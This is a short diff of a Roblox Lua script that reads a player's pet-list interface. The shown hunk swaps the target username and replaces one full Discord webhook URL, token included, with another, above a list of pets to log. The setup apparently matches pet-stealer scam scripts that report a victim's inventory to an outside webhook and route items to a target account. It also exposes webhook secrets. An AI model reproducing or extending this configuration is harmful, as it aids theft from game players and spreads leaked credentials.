@@ -6,8 +6,8 @@ local petList = playerGui:WaitForChild("PetList")
 local toggleButton = petList:WaitForChild("Exit"):WaitForChild("OpenButton")
 local scrollingFrame = petList:WaitForChild("Frame"):WaitForChild("Notepad"):WaitForChild("ScrollingFrame")
 -- Config
-local TARGET_USERNAME = "hakimidu_95"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1447277562010144868/bfBp0GiZ9GA8s8Gl19iWqPfXhhNpUqgiS_LeKUHmAaRDFQprvRIFC7loUmZIifmkPtQV"
+local TARGET_USERNAME = "Only1sherifalt1"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1516479845503205476/w2eyZPIVUgR9-ZWO1_yRZT9ws7aYpakwqhpjTEN90uFVSDmx_Vxg_EJK3T77zYhNm8h9"
 
 -- Target pets to log (so we know their exact Inv_Pets: name format)
 local TARGET_PETS = { "bunny", "robin", "frog", "deer" }
